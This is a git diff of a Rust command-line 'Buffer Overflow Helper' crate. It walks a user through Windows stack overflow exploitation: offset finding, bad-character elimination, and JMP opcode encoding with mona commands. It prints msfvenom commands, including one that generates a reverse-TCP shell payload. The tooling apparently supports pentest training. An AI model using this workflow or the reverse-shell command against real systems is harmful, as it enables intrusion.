@@ -1,17 +1,22 @@
-use std::collections::VecDeque;
+#![warn(missing_debug_implementations, rust_2018_idioms, missing_docs)]
+
+//! # Buffer Overflow Helper
+//!
+//! A crate for helping with simple buffer overflows.
+//! It guides you through the relevant steps, providing commands as you go.
+
 use std::error::Error;
-use std::io::{self, Write};
+use std::io::{self, Cursor, Write};
+use std::mem;
 
-// Step by step
-//     1. EIP offset (pattern creation)
-//     2. Space available (offset conversion hex => dec)
-//     3. Bad characters
-//     4. Find module
-//     5. Opcode search
-//     6. Find address of opcode
-//     7. Pop calc shellcode
-//     8. Reverse shell shellcode
+use ansi_term::Colour::{Green, Yellow};
+use x86asm::{InstructionWriter, Mnemonic, Mode, Operand, Reg};
 
+mod hex;
+
+use hex::HexByte;
+
+#[derive(Debug, PartialEq, Eq)]
 enum State {
     PatternGeneration,
     PatternOffset,
@@ -19,15 +24,65 @@ enum State {
     BadChars,
     FindModule,
     OpCodeToHex,
-    FindOpCodeAddress,
     PopCalc,
     PopShell,
+    Done,
 }
 
-pub fn run() -> Result<(), Box<dyn Error>> {
+impl State {
+    fn next(&mut self) {
+        use State::*;
+
+        *self = match mem::replace(self, PatternGeneration) {
+            PatternGeneration => PatternOffset,
+            PatternOffset => SpaceAvailable,
+            SpaceAvailable => BadChars,
+            BadChars => FindModule,
+            FindModule => OpCodeToHex,
+            OpCodeToHex => PopCalc,
+            PopCalc => PopShell,
+            PopShell => Done,
+            Done => Done,
+        };
+    }
+
+    fn prev(&mut self) {
+        use State::*;
+
+        *self = match mem::replace(self, PatternGeneration) {
+            PatternGeneration => PatternGeneration,
+            PatternOffset => PatternGeneration,
+            SpaceAvailable => PatternOffset,
+            BadChars => SpaceAvailable,
+            FindModule => BadChars,
+            OpCodeToHex => FindModule,
+            PopCalc => OpCodeToHex,
+            PopShell => PopCalc,
+            Done => PopShell,
+        };
+    }
+}
+
+/// Entry point for running the buffer overflow helper.
+///
+/// Follows the following steps:
+///
+/// 1. Pattern generation: generate a pattern of specified length
+/// 2. Pattern offset: get offset to `EIP` or anything else
+/// 3. Space available: hex -> dec conversion
+/// 4. Bad characters: interactively removes bad characters
+/// 5. Find module: provides command for finding modules
+/// 6. Op code search: op code -> hex conversion, with command for finding module
+/// 7. Pop calc shellcode: provides relevant command
+/// 8. Reverse shell shellcode: provides relevant command
+
+pub fn run() {
+    ansi_term::enable_ansi_support().unwrap_or_else(|_| println!("Enabling ANSI support failed"));
+
     let mut state = State::PatternGeneration;
     let mut pattern = String::new();
     let mut buffer = String::new();
+    let mut bad_chars: Vec<HexByte> = Vec::new();
 
     loop {
         match state {
@@ -47,21 +102,23 @@ pub fn run() -> Result<(), Box<dyn Error>> {
 
                 println!("{}", pattern);
 
-                state =
-                    ask_retry_default_no("Generate another pattern", state, State::PatternOffset);
+                ask_retry_default_no("Generate another pattern", &mut state);
             }
             State::PatternOffset => {
-                print!("\nFind offset(s) of: ");
+                print!("\n{}", Green.paint("Find offset(s) of: "));
                 io::stdout().flush().unwrap();
 
                 read_line_until_no_err(&mut buffer);
 
                 buffer = buffer.trim().to_string();
 
-                let needle: HexString;
+                let needle: hex::HexString;
 
-                match HexString::from_hex_str(buffer.as_str(), Endianness::Big, Endianness::Little)
-                {
+                match hex::HexString::from_hex_str(
+                    &buffer,
+                    hex::Endianness::Big,
+                    hex::Endianness::Little,
+                ) {
                     Ok(hex_string) => needle = hex_string,
                     Err(e) => {
                         println!("Error: {}", e);
@@ -69,8 +126,11 @@ pub fn run() -> Result<(), Box<dyn Error>> {
                     }
                 }
 
-                let haystack =
-                    HexString::from_str(pattern.as_str(), Endianness::Little, Endianness::Little);
+                let haystack = hex::HexString::from_str(
+                    &pattern,
+                    hex::Endianness::Little,
+                    hex::Endianness::Little,
+                );
 
                 let offsets = haystack.get_offsets(needle);
 
@@ -82,12 +142,11 @@ pub fn run() -> Result<(), Box<dyn Error>> {
                     println!("No matches found");
                 }
 
-                state =
-                    ask_retry_default_no("Search for another match", state, State::SpaceAvailable);
+                ask_retry_default_no("Search for another match", &mut state);
             }
             State::SpaceAvailable => {
                 print!(
-                    "\nProvide address offset from the start of payload to the end of usable memory: "
+                    "\n{}", Green.paint("Provide hexadecimal address offset from the start of payload to the end of usable memory: ")
                 );
                 io::stdout().flush().unwrap();
 
@@ -95,7 +154,11 @@ pub fn run() -> Result<(), Box<dyn Error>> {
 
                 buffer = buffer.trim().to_string();
 
-                match HexString::from_hex_str(buffer.as_str(), Endianness::Big, Endianness::Big) {
+                match hex::HexString::from_hex_str(
+                    &buffer,
+                    hex::Endianness::Big,
+                    hex::Endianness::Big,
+                ) {
                     Ok(hex_string) => match hex_string.as_usize() {
                         Some(i) => println!("Space available is {}", i),
                         None => println!(
@@ -103,28 +166,221 @@ pub fn run() -> Result<(), Box<dyn Error>> {
                         ),
                     },
                     Err(e) => {
-                        println!("Unable to create a HexString from {}: {}", buffer, e);
+                        println!("Unable to create a hex::HexString from {}: {}", buffer, e);
                     }
                 }
 
-                state = ask_retry_default_no(
-                    "Search for available space again",
-                    state,
-                    State::BadChars,
-                );
+                ask_retry_default_no("Search for available space again", &mut state);
             }
-            State::BadChars => unimplemented!(),
-            State::FindModule => unimplemented!(),
-            State::OpCodeToHex => unimplemented!(),
-            State::FindOpCodeAddress => unimplemented!(),
-            State::PopCalc => unimplemented!(),
-            State::PopShell => unimplemented!(),
+            State::BadChars => {
+                let python2_bad_chars = r#"bad_chars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
+"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
+"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
+"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
+"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
+"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
+"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
+"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)"#;
+
+                let python3_bad_chars = r#"bad_chars = (
+b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
+b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
+b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
+b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
+b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
+b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
+b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
+b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)"#;
+
+                let mut bad_chars_buffer: String;
+                bad_chars.clear();
+
+                loop {
+                    print!(
+                        "\n{}",
+                        Green.paint(
+                            "Do you want the bad characters in Python(2) or Python(3) format?: "
+                        )
+                    );
+                    io::stdout().flush().unwrap();
+
+                    read_line_until_no_err(&mut buffer);
+                    buffer = buffer.trim().to_ascii_lowercase();
+
+                    if buffer.len() > 0 {
+                        match buffer.chars().nth(0).unwrap() {
+                            '2' => {
+                                bad_chars_buffer = python2_bad_chars.to_string();
+
+                                println!();
+                                println!("{}", bad_chars_buffer);
+
+                                break;
+                            }
+                            '3' => {
+                                bad_chars_buffer = python3_bad_chars.to_string();
+
+                                println!();
+                                println!("{}", bad_chars_buffer);
+
+                                break;
+                            }
+                            _ => (),
+                        }
+                    }
+                }
+
+                loop {
+                    print!(
+                        "{}",
+                        Green
+                            .paint("\nInput bad hex character (omit prefix, \"done\" to finish): ")
+                    );
+                    io::stdout().flush().unwrap();
+
+                    read_line_until_no_err(&mut buffer);
+                    buffer = buffer.trim().to_ascii_lowercase();
+
+                    if buffer.len() > 0 {
+                        if buffer == "done" {
+                            break;
+                        }
+
+                        if let Some(_) = bad_chars_buffer.find(&buffer) {
+                            bad_chars_buffer =
+                                bad_chars_buffer.replace(&format!("\\x{}", buffer), "");
+
+                            match HexByte::from_hex_str(&buffer) {
+                                Ok(hex_byte) => bad_chars.push(hex_byte),
+                                Err(e) => println!("Error: {}", e),
+                            }
+
+                            println!("Found and removed {}", buffer);
+                        } else {
+                            println!("Could not find {}", buffer);
+                        }
+
+                        println!("\n{}", bad_chars_buffer);
+                    }
+                }
+
+                ask_retry_default_no("Redo bad character elimination?", &mut state);
+            }
+            State::FindModule => {
+                println!("\nSearch for modules: !mona modules");
+
+                state.next();
+            }
+            State::OpCodeToHex => {
+                print!("\n{}", Green.paint("Jump to which register? "));
+                io::stdout().flush().unwrap();
+
+                read_line_until_no_err(&mut buffer);
+
+                buffer = buffer.trim().to_ascii_lowercase();
+
+                let reg = match buffer.as_str() {
+                    "eax" => Some(Reg::EAX),
+                    "ecx" => Some(Reg::ECX),
+                    "edx" => Some(Reg::EDX),
+                    "ebx" => Some(Reg::EBX),
+                    "esp" => Some(Reg::ESP),
+                    "ebp" => Some(Reg::EBP),
+                    "esi" => Some(Reg::ESI),
+                    "edi" => Some(Reg::EDI),
+                    "r8d" => Some(Reg::R8D),
+                    "r9d" => Some(Reg::R9D),
+                    "r10d" => Some(Reg::R10D),
+                    "r11d" => Some(Reg::R11D),
+                    "r12d" => Some(Reg::R12D),
+                    "r13d" => Some(Reg::R13D),
+                    "r14d" => Some(Reg::R14D),
+                    "r15d" => Some(Reg::R15D),
+                    _ => None,
+                };
+
+                if let Some(r) = reg {
+                    let reg = r;
+
+                    let asm_buffer = Cursor::new(Vec::new());
+                    let mut writer = InstructionWriter::new(asm_buffer, Mode::Protected);
+
+                    writer.write1(Mnemonic::JMP, Operand::Direct(reg)).unwrap();
+
+                    let mut hex_instructions: Vec<HexByte> = Vec::with_capacity(2);
+
+                    for byte in writer.get_inner_writer_ref().get_ref().iter() {
+                        print!("{:02X} ", byte);
+
+                        hex_instructions
+                            .push(HexByte::from_hex_str(&format!("{:02X}", byte)).unwrap());
+                    }
+                    print!(r#" => !mona find -s ""#);
+
+                    for instruction in hex_instructions.into_iter() {
+                        print!("\\x{}", instruction.to_string());
+                    }
+
+                    println!(r#"" -m <module>"#);
+                    println!("Note: ensure base address does not contain bad characters and remember results are in big endian");
+
+                    ask_retry_default_no("Jump to a different register?", &mut state);
+                } else {
+                    println!("Invalid selection");
+                }
+            }
+            State::PopCalc => {
+                print!("\nPop calc  => msfvenom -p windows/exec CMD=calc.exe -f py -b \"");
+
+                for hex_byte in &bad_chars {
+                    print!("\\x{}", &hex_byte.to_string());
+                }
+
+                println!("\"");
+
+                state.next();
+            }
+            State::PopShell => {
+                print!("\nPop shell => msfvenom -p windows/shell_reverse_tcp LHOST=<local ip> LPORT=443 EXITFUNC=thread -f py -a x86 -b \"");
+
+                for hex_byte in &bad_chars {
+                    print!("\\x{}", &hex_byte.to_string());
+                }
+
+                println!("\"");
+
+                state.next();
+            }
+            State::Done => {
+                println!("\n{}\n", Green.paint("DONE!"));
+
+                return;
+            }
         }
     }
 }
 
 fn get_number_input() -> Result<usize, Box<dyn Error>> {
-    print!("\nPattern length: ");
+    print!("\n{}", Green.paint("Pattern length: "));
     io::stdout().flush().unwrap();
 
     let mut buffer = String::new();
@@ -145,11 +401,10 @@ fn read_line_until_no_err(buf: &mut String) {
     }
 }
 
-fn ask_retry_default_no(prompt: &str, current_state: State, next_state: State) -> State {
+fn ask_retry_default_no(prompt: &str, state: &mut State) {
     let mut buffer = String::new();
-    let state: State;
 
-    print!("\n{} [y/N]? ", prompt);
+    print!("\n{}", Yellow.paint(format!("{} [y/N]? ", prompt)));
     io::stdout().flush().unwrap();
 
     read_line_until_no_err(&mut buffer);
@@ -162,9 +417,9 @@ fn ask_retry_default_no(prompt: &str, current_state: State, next_state: State) -
         .unwrap_or_else(|| 'n')
         .to_ascii_lowercase()
     {
-        'y' => current_state,
-        _ => next_state,
-    }
+        'y' => (),
+        _ => state.next(),
+    };
 }
 
 fn generate_pattern(length: usize) -> String {
@@ -192,473 +447,26 @@ fn generate_pattern(length: usize) -> String {
     }
 }
 
-#[derive(Clone, Copy, Debug, PartialEq, Eq)]
-enum Endianness {
-    Big,
-    Little,
-}
-
-// Little-endian hexadecimal string
-#[derive(Debug, PartialEq, Eq)]
-pub struct HexString {
-    hex_bytes: Vec<HexByte>,
-    endianness: Endianness,
-}
-
-impl HexString {
-    // Creates a `HexString` with the appropriate `Endianness`
-    fn from_hex_bytes(
-        mut hex_bytes: Vec<HexByte>,
-        source_endianness: Endianness,
-        target_endianness: Endianness,
-    ) -> HexString {
-        if source_endianness != target_endianness {
-            hex_bytes.reverse();
-        }
-
-        HexString {
-            hex_bytes,
-            endianness: target_endianness,
-        }
-    }
-
-    fn from_hex_str(
-        s: &str,
-        source_endianness: Endianness,
-        target_endianness: Endianness,
-    ) -> Result<HexString, String> {
-        let mut string_of_hex_chars = String::new();
-
-        // Prefix '0' if odd numebr of characters to pad into bytes
-        if s.len() % 2 != 0 {
-            string_of_hex_chars.push('0');
-        }
-
-        string_of_hex_chars.push_str(s);
-
-        let mut hex_bytes = Vec::with_capacity((string_of_hex_chars.len()) / 2);
-
-        for i in 0..hex_bytes.capacity() {
-            // Push indices 0..=1, then 2..=3, etc. in blocks of up to 2 nibbles, making up a byte (or padded to it when making a `HexByte`)
-            let start_index = i * 2;
-            let end_index = i * 2 + 1;
-
-            let hex_byte = HexByte::from_hex_str(&string_of_hex_chars[start_index..=end_index])?;
-            hex_bytes.push(hex_byte);
-        }
-
-        Ok(HexString::from_hex_bytes(
-            hex_bytes,
-            source_endianness,
-            target_endianness,
-        ))
-    }
-
-    // Converts each character of `s` into a `HexByte`, constructing a `HexString`
-    fn from_str(
-        s: &str,
-        source_endianness: Endianness,
-        target_endianness: Endianness,
-    ) -> HexString {
-        let mut hex_bytes = Vec::with_capacity(s.len());
-
-        for c in s.chars() {
-            hex_bytes.push(HexByte::from(c));
-        }
-
-        HexString::from_hex_bytes(hex_bytes, source_endianness, target_endianness)
-    }
-
-    // Changes the endianness and associated contents
-    fn as_endianness(self, endianness: Endianness) -> HexString {
-        let mut hex_bytes = self.hex_bytes.clone();
-
-        if self.endianness != endianness {
-            hex_bytes.reverse();
-        }
-
-        HexString {
-            hex_bytes,
-            endianness,
-        }
-    }
-
-    // Returns a vector of the indices at which `needle` is found in `self.hex_bytes`
-    fn get_offsets(&self, mut needle: HexString) -> Vec<usize> {
-        let mut matches = Vec::new();
-
-        // Ensure that the needle is not empty and not larger than the search content
-        if needle.hex_bytes.len() == 0 || self.hex_bytes.len() < needle.hex_bytes.len() {
-            return matches;
-        }
-
-        if needle.endianness != self.endianness {
-            needle = needle.as_endianness(self.endianness);
-        }
-
-        // Use a `VecDeque` as a FIFO which contains content equivalent to the needle size for comparison
-        let mut current_hex_bytes = VecDeque::with_capacity(needle.hex_bytes.len());
-
-        for i in 0..self.hex_bytes.len() {
-            // Not enough remaining content to update `current_hex_bytes` without going OOB
-            if i + needle.hex_bytes.len() > self.hex_bytes.len() {
-                break;
-            }
-
-            // Update the FIFO
-            if i == 0 {
-                // Setup the FIFO on the first iteration
-                for i in 0..needle.hex_bytes.len() {
-                    // `unwrap` as we have previously checked that `contents` has at least the same length as `needle`
-                    current_hex_bytes.push_back(self.hex_bytes.get(i).unwrap());
-                }
-            } else {
-                // Update the FIFO on each iteration after the first, `unwrap` because we've already protected against OOB
-                current_hex_bytes.pop_front();
-                current_hex_bytes
-                    .push_back(self.hex_bytes.get(i + needle.hex_bytes.len() - 1).unwrap());
-            }
-
-            let mut matched = true;
-
-            // Check whether `current_hex_bytes` and `needle` match
-            for (&a, b) in current_hex_bytes.iter().zip(needle.hex_bytes.iter()) {
-                if a != b {
-                    matched = false;
-                    break;
-                }
-            }
-
-            if matched {
-                matches.push(i);
-            }
-        }
-
-        return matches;
-    }
-
-    fn as_hex_string(self, endianness: Endianness) -> String {
-        let mut result = String::with_capacity(self.hex_bytes.len() * 2);
-
-        let hex_string = match endianness == self.endianness {
-            true => self,
-            false => self.as_endianness(endianness),
-        };
-
-        hex_string
-            .hex_bytes
-            .into_iter()
-            .for_each(|hex_byte| result.push_str(hex_byte.contents.as_str()));
-
-        result
-    }
-
-    fn as_usize(self) -> Option<usize> {
-        match usize::from_str_radix(self.as_hex_string(Endianness::Big).as_str(), 16) {
-            Ok(i) => Some(i),
-            Err(_) => None,
-        }
-    }
-}
-
-// Two lower case hexadecimal characters, making up one byte
-#[derive(Clone, Debug, PartialEq, Eq)]
-pub struct HexByte {
-    contents: String,
-}
-
-impl HexByte {
-    // Creates a new `HexByte`, consisting of lower case characters, ensuring it's a valid hexadecimal value
-    fn from_hex_str(hex_byte: &str) -> Result<HexByte, String> {
-        if hex_byte.len() > 2 {
-            return Err(format!(
-                "HexByte contents must be of most length 2, provided: {}",
-                hex_byte.len()
-            ));
-        }
-
-        let hex_byte = format!("{:0>2}", hex_byte.to_owned());
-
-        // Validate is 0-9, a-f, or A-F
-        for c in hex_byte.chars() {
-            if !((c as u8 >= 48 && c as u8 <= 57)
-                || (c as u8 >= 65 && c as u8 <= 70)
-                || (c as u8 >= 97 && c as u8 <= 102))
-            {
-                return Err(format!(
-                    "cannot instantiate a HexByte with a non-hexadecimal character: {}",
-                    c
-                ));
-            }
-        }
-
-        Ok(HexByte {
-            contents: hex_byte.to_lowercase(),
-        })
-    }
-}
-
-impl From<char> for HexByte {
-    fn from(c: char) -> Self {
-        // `unwrap` as we are passing an arugment which should never fail
-        HexByte::from_hex_str(format!("{:x}", c as u8).as_str()).unwrap()
-    }
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
 
-    fn setup_hex_bytes() -> Vec<HexByte> {
-        vec![
-            HexByte::from_hex_str("a0").unwrap(),
-            HexByte::from_hex_str("00").unwrap(),
-            HexByte::from_hex_str("ff").unwrap(),
-            HexByte::from_hex_str("90").unwrap(),
-            HexByte::from_hex_str("7b").unwrap(),
-        ]
+    #[test]
+    fn next_state() {
+        let mut state = State::PatternGeneration;
+
+        state.next();
+
+        assert_eq!(state, State::PatternOffset);
     }
 
     #[test]
-    fn hex_string_from_hex_bytes() {
-        let hex_bytes = setup_hex_bytes();
+    fn prev_state() {
+        let mut state = State::Done;
 
-        let correct_hex_bytes = hex_bytes.clone();
+        state.prev();
 
-        let hex_string =
-            HexString::from_hex_bytes(hex_bytes, Endianness::Little, Endianness::Little);
-
-        assert_eq!(correct_hex_bytes, hex_string.hex_bytes);
-    }
-
-    #[test]
-    fn hex_string_from_hex_bytes_changing_endianness() {
-        let hex_bytes = setup_hex_bytes();
-
-        let mut correct_hex_bytes = hex_bytes.clone();
-        correct_hex_bytes.reverse();
-
-        let hex_string = HexString::from_hex_bytes(hex_bytes, Endianness::Big, Endianness::Little);
-
-        assert_eq!(correct_hex_bytes, hex_string.hex_bytes);
-    }
-
-    #[test]
-    fn hex_string_from_hex_str() {
-        let hex_string =
-            HexString::from_hex_str("a000ff907b", Endianness::Little, Endianness::Little).unwrap();
-
-        assert_eq!(setup_hex_bytes(), hex_string.hex_bytes);
-    }
-
-    #[test]
-    fn hex_string_from_hex_str_changing_endianness() {
-        let hex_string =
-            HexString::from_hex_str("7b90ff00a0", Endianness::Little, Endianness::Big).unwrap();
-
-        assert_eq!(setup_hex_bytes(), hex_string.hex_bytes);
-    }
-
-    #[test]
-    fn hex_string_from_hex_str_nibble() {
-        let hex_string =
-            HexString::from_hex_str("fff", Endianness::Little, Endianness::Little).unwrap();
-
-        assert_eq!(
-            HexByte::from_hex_str("0f").unwrap(),
-            hex_string.hex_bytes[0]
-        );
-    }
-
-    #[test]
-    fn hex_string_from_invalid_hex_str() {
-        let result = HexString::from_hex_str("x0", Endianness::Little, Endianness::Little);
-
-        assert!(result.is_err());
-    }
-
-    fn setup_ascii_hex_bytes() -> Vec<HexByte> {
-        vec![
-            HexByte::from_hex_str("41").unwrap(), // A
-            HexByte::from_hex_str("61").unwrap(), // a
-            HexByte::from_hex_str("30").unwrap(), // 0
-            HexByte::from_hex_str("41").unwrap(), // A
-            HexByte::from_hex_str("61").unwrap(), // a
-            HexByte::from_hex_str("31").unwrap(), // 1
-            HexByte::from_hex_str("41").unwrap(), // A
-            HexByte::from_hex_str("61").unwrap(), // a
-            HexByte::from_hex_str("32").unwrap(), // 2
-        ]
-    }
-
-    #[test]
-    fn hex_string_from_str() {
-        let hex_string = HexString::from_str("Aa0Aa1Aa2", Endianness::Little, Endianness::Little);
-
-        assert_eq!(hex_string.hex_bytes, setup_ascii_hex_bytes());
-    }
-
-    #[test]
-    fn hex_string_from_str_chainging_endianness() {
-        let hex_string = HexString::from_str("Aa0Aa1Aa2", Endianness::Big, Endianness::Little);
-
-        let mut correct_hex_bytes = setup_ascii_hex_bytes();
-
-        correct_hex_bytes.reverse();
-
-        assert_eq!(hex_string.hex_bytes, correct_hex_bytes);
-    }
-
-    #[test]
-    fn hex_string_as_literal_hex_string() {
-        let hex_string =
-            HexString::from_hex_str("00112233", Endianness::Big, Endianness::Big).unwrap();
-
-        assert_eq!(hex_string.as_hex_string(Endianness::Big), "00112233");
-    }
-
-    #[test]
-    fn hex_string_as_literal_hex_string_with_opposite_endianness() {
-        let hex_string =
-            HexString::from_hex_str("00112233", Endianness::Big, Endianness::Big).unwrap();
-
-        assert_eq!(hex_string.as_hex_string(Endianness::Little), "33221100");
-    }
-
-    #[test]
-    fn hex_string_into_usize() {
-        let hex_string =
-            HexString::from_hex_str("00112233", Endianness::Big, Endianness::Big).unwrap();
-
-        assert_eq!(hex_string.as_usize(), Some(1122867));
-    }
-
-    #[test]
-    fn hex_string_too_large_for_usize() {
-        let hex_string =
-            HexString::from_hex_str("fffffffffffffffff", Endianness::Big, Endianness::Big).unwrap();
-
-        assert_eq!(hex_string.as_usize(), None);
-    }
-
-    fn create_le_hex_string() -> HexString {
-        HexString::from_hex_str("Aa0Aa1Aa2", Endianness::Little, Endianness::Little).unwrap()
-    }
-
-    #[test]
-    fn set_same_endianness() {
-        let mut hex_string = create_le_hex_string();
-
-        hex_string = hex_string.as_endianness(Endianness::Little);
-
-        assert_eq!(hex_string.endianness, Endianness::Little);
-        assert_eq!(hex_string.hex_bytes, create_le_hex_string().hex_bytes);
-    }
-
-    #[test]
-    fn set_different_endianness() {
-        let mut hex_string = create_le_hex_string();
-
-        hex_string = hex_string.as_endianness(Endianness::Big);
-
-        let mut correct_hex_bytes = create_le_hex_string().hex_bytes;
-        correct_hex_bytes.reverse();
-
-        assert_eq!(hex_string.endianness, Endianness::Big);
-        assert_eq!(hex_string.hex_bytes, correct_hex_bytes);
-    }
-
-    #[test]
-    fn get_single_offset() {
-        let haystack =
-            HexString::from_hex_str("0011223344", Endianness::Little, Endianness::Little).unwrap();
-
-        let needle =
-            HexString::from_hex_str("2233", Endianness::Little, Endianness::Little).unwrap();
-
-        let offsets = haystack.get_offsets(needle);
-
-        assert_eq!(offsets.len(), 1);
-        assert_eq!(*offsets.get(0).unwrap(), 2);
-    }
-
-    #[test]
-    fn get_single_offset_with_swapped_endian() {
-        let haystack =
-            HexString::from_hex_str("0011223344", Endianness::Little, Endianness::Little).unwrap();
-
-        let needle = HexString::from_hex_str("3322", Endianness::Big, Endianness::Little).unwrap();
-
-        let offsets = haystack.get_offsets(needle);
-
-        assert_eq!(offsets.len(), 1);
-        assert_eq!(*offsets.get(0).unwrap(), 2);
-    }
-
-    #[test]
-    fn get_multiple_offsets() {
-        let haystack = HexString::from_hex_str(
-            "00112233440011223344",
-            Endianness::Little,
-            Endianness::Little,
-        )
-        .unwrap();
-
-        let needle =
-            HexString::from_hex_str("2233", Endianness::Little, Endianness::Little).unwrap();
-
-        let offsets = haystack.get_offsets(needle);
-
-        assert_eq!(offsets.len(), 2);
-        assert_eq!(*offsets.get(0).unwrap(), 2);
-        assert_eq!(*offsets.get(1).unwrap(), 7);
-    }
-
-    #[test]
-    fn get_no_matching_offsets() {
-        let haystack =
-            HexString::from_hex_str("0011223344", Endianness::Little, Endianness::Little).unwrap();
-
-        let needle = HexString::from_hex_str("55", Endianness::Little, Endianness::Little).unwrap();
-
-        let offsets = haystack.get_offsets(needle);
-
-        assert_eq!(offsets.len(), 0);
-    }
-
-    #[test]
-    fn hex_byte_from_hex_str() {
-        assert_eq!(HexByte::from_hex_str("AB").unwrap().contents, "ab");
-    }
-
-    #[test]
-    fn hex_byte_from_hex_str_nibble() {
-        assert_eq!(HexByte::from_hex_str("1").unwrap().contents, "01");
-    }
-
-    #[test]
-    fn hex_byte_from_empty_hex_str() {
-        assert_eq!(HexByte::from_hex_str("").unwrap().contents, "00");
-    }
-
-    #[test]
-    fn hex_byte_from_too_long_hex_str() {
-        assert!(HexByte::from_hex_str("FFFF").is_err());
-    }
-
-    #[test]
-    fn hex_byte_from_invalid_hex_str() {
-        assert!(HexByte::from_hex_str("F0J5").is_err());
-    }
-
-    #[test]
-    fn hex_byte_from_char() {
-        assert_eq!(HexByte::from('A').contents, "41");
-    }
-
-    #[test]
-    fn hex_byte_from_unicode_char() {
-        assert_eq!(HexByte::from('é').contents, "e9");
+        assert_eq!(state, State::PopShell);
     }
 
     #[test]
@@ -696,10 +504,11 @@ mod tests {
         let pattern = generate_pattern(3000);
 
         let haystack =
-            HexString::from_str(pattern.as_str(), Endianness::Little, Endianness::Little);
+            hex::HexString::from_str(&pattern, hex::Endianness::Little, hex::Endianness::Little);
 
         let needle =
-            HexString::from_hex_str("42397042", Endianness::Big, Endianness::Little).unwrap();
+            hex::HexString::from_hex_str("42397042", hex::Endianness::Big, hex::Endianness::Little)
+                .unwrap();
 
         let offset = haystack.get_offsets(needle).pop().unwrap();
 
